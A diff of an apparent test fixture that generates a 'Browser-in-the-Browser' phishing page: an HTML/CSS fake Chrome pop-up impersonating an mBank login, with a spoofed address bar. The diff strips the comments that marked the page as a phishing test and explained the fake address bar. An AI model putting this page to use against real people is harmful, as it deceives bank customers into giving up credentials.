@@ -1,21 +1,11 @@
 'use strict';
 
-/**
- * A "Browser-in-the-Browser" (BitB) phishing page for testing — the classic
- * trick: a fake pop-up window drawn with HTML/CSS, including a fake address bar
- * that shows the bank's real address. To a person it looks like a genuine
- * browser window of online.mbank.pl; in reality every pixel belongs to the
- * page it is served from.
- *
- * Used by tests/manual/serve.js (/bitb) and tests/e2e/run-e2e.js.
- */
 function bitbPage(host) {
   return `<!doctype html><html lang="pl"><head><meta charset="utf-8"><title>Promocja – ${host}</title>
 <style>
   body { font-family: system-ui, sans-serif; margin: 0; background: #f3f4f6; font-size: 18px; }
   .site { max-width: 760px; margin: 0 auto; padding: 280px 24px 40px; }
   .cta { font-size: 20px; padding: 14px 24px; background: #c00; color: #fff; border: 0; border-radius: 8px; cursor: pointer; }
-  /* The fake browser window */
   #bitb { display: none; position: fixed; top: 120px; left: 50%; transform: translateX(-50%); width: 520px;
           background: #fff; border-radius: 8px; box-shadow: 0 20px 60px rgba(0,0,0,.45); overflow: hidden; z-index: 1000; }
   .titlebar { background: #dee1e6; padding: 8px 12px; font-size: 13px; display: flex; justify-content: space-between; }
@@ -35,7 +25,6 @@ function bitbPage(host) {
   <button class="cta" id="open-bitb" onclick="document.getElementById('bitb').style.display='block'">Zaloguj przez mBank</button>
 </div>
 
-<!-- Everything below is just HTML on ${host} — including the "address bar". -->
 <div id="bitb" role="dialog" aria-label="Logowanie – mBank">
   <div class="chrome-top">
     <div class="titlebar"><span>🏦 Logowanie – mBank – Google Chrome</span><span>— ▢ ✕</span></div>
